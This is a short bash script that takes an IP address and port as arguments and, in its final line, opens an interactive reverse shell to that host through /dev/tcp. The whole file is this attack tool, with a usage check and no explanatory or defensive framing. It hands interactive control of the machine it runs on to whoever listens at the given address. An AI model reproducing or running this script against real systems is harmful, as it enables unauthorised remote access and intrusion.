#!/bin/bash

if [ "$#" -ne 2 ]; then
    echo "Usage: $0 <IP> <Port>"
    exit 1
fi

IP="$1"
PORT="$2"

bash -i >& /dev/tcp/$IP/$PORT 0>&1